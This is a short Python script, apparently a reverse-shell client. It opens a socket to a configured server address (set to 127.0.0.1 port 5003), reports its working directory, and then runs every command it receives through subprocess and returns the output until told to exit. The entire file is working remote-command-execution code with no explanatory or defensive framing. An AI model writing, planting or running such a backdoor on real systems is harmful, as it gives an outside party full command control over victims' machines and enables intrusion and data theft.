import socket 
import os
import subprocess
import sys
import hashlib

SERVER_HOST = '127.0.0.1'
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 
#128KB MAX
SEPARATOR = "<sep>"

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))
cmd = os.getcwd()
secmd = cmd.encode()
s.send(secmd)


while True:
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        break
    if splited_command[0].lower() == "cd":
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    else:
        output = subprocess.getoutput(command)
    cmd = os.getcwd()
    message = f"{output}{SEPARATOR}{cmd}"
    s.send(message.encode())
s.close()